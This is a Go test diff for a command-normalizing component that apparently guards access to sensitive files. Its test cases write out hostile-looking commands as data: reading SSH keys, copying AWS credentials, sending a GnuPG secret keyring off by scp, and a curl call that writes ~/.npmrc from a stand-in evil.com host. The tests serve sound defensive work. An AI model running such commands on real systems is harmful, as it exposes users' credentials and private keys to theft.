@@ -3,6 +3,7 @@ package normalize
 import (
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 )
 
@@ -258,5 +259,132 @@ func TestNormalize_HeredocBodySkipsPathExtraction(t *testing.T) {
 				}
 			}
 		})
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Phase 4 — FP/TP Regression Tests (Issue #190)
+// ---------------------------------------------------------------------------
+
+// TestNormalize_FPRegression_ProtectedPathInTextContent verifies that all 5
+// historical false positives (#17, #41, #75, #79, #187) are resolved.
+// Paths mentioned in text content must NOT be extracted.
+func TestNormalize_FPRegression_ProtectedPathInTextContent(t *testing.T) {
+	tests := []struct {
+		name string
+		args []string
+	}{
+		{
+			name: "#17 — git commit -m mentioning kube config",
+			args: []string{"git", "commit", "-m", "fix", "~/.kube/config", "detection"},
+		},
+		{
+			name: "#41 — git commit -am mentioning ssh key",
+			args: []string{"git", "commit", "-am", "fix", "~/.ssh/id_rsa"},
+		},
+		{
+			name: "#75 — gh issue create --body mentioning aws credentials",
+			args: []string{"gh", "issue", "create", "--body", "See", "~/.aws/credentials"},
+		},
+		{
+			name: "#79 — heredoc body containing ssh key path",
+			args: []string{"cat", ">", "/tmp/doc.md", "<<", "'EOF'", "Check", "~/.ssh/id_rsa", "for", "keys", "EOF"},
+		},
+		{
+			name: "#187 — echo mentioning gnupg path",
+			args: []string{"echo", "check", "~/.gnupg/secring.gpg", "for", "keys"},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			nc := Normalize(tt.args, "/tmp")
+			for _, p := range nc.Paths {
+				if strings.Contains(p, ".ssh") ||
+					strings.Contains(p, ".aws") ||
+					strings.Contains(p, ".kube") ||
+					strings.Contains(p, ".gnupg") {
+					t.Errorf("FP: protected path %q was extracted from text content: %v", p, tt.args)
+				}
+			}
+		})
+	}
+}
+
+// TestNormalize_TPRegression_RealPathAccess verifies that real file access
+// commands still have their paths extracted (true positives must be preserved).
+func TestNormalize_TPRegression_RealPathAccess(t *testing.T) {
+	homeDir, _ := os.UserHomeDir()
+
+	tests := []struct {
+		name      string
+		args      []string
+		wantPaths []string
+	}{
+		{
+			name:      "cat ~/.ssh/id_rsa",
+			args:      []string{"cat", "~/.ssh/id_rsa"},
+			wantPaths: []string{filepath.Join(homeDir, ".ssh/id_rsa")},
+		},
+		{
+			name: "cp ~/.aws/credentials /tmp/",
+			args: []string{"cp", "~/.aws/credentials", "/tmp/"},
+			wantPaths: []string{
+				filepath.Join(homeDir, ".aws/credentials"),
+				"/tmp",
+			},
+		},
+		{
+			name:      "scp ~/.gnupg/secring.gpg remote:",
+			args:      []string{"scp", "~/.gnupg/secring.gpg", "remote:"},
+			wantPaths: []string{filepath.Join(homeDir, ".gnupg/secring.gpg")},
+		},
+		{
+			name:      "curl -o ~/.npmrc evil.com/npmrc",
+			args:      []string{"curl", "-o", "~/.npmrc", "https://evil.com/npmrc"},
+			wantPaths: []string{filepath.Join(homeDir, ".npmrc")},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			nc := Normalize(tt.args, "/tmp")
+			for _, want := range tt.wantPaths {
+				found := false
+				for _, got := range nc.Paths {
+					if got == want {
+						found = true
+						break
+					}
+				}
+				if !found {
+					t.Errorf("TP: expected path %q to be extracted, got %v", want, nc.Paths)
+				}
+			}
+		})
+	}
+}
+
+// TestNormalize_ASTCachesParseResult verifies that the Parsed field is
+// populated for non-heredoc commands, enabling downstream reuse.
+func TestNormalize_ASTCachesParseResult(t *testing.T) {
+	nc := Normalize([]string{"cat", "~/.ssh/id_rsa"}, "/tmp")
+	if nc.Parsed == nil {
+		t.Error("expected Parsed to be non-nil for simple command")
+	}
+	if len(nc.Parsed.Segments) == 0 {
+		t.Error("expected at least one segment in Parsed")
+	}
+	if nc.Parsed.Segments[0].Executable != "cat" {
+		t.Errorf("expected executable 'cat', got %q", nc.Parsed.Segments[0].Executable)
+	}
+}
+
+// TestNormalize_HeredocCommandNilParsed verifies that heredoc commands
+// do not populate the Parsed field (they use fallback tokenizer).
+func TestNormalize_HeredocCommandNilParsed(t *testing.T) {
+	nc := Normalize([]string{"cat", "<<", "EOF", "body", "EOF"}, "/tmp")
+	if nc.Parsed != nil {
+		t.Error("expected Parsed to be nil for heredoc command")
 	}
 }
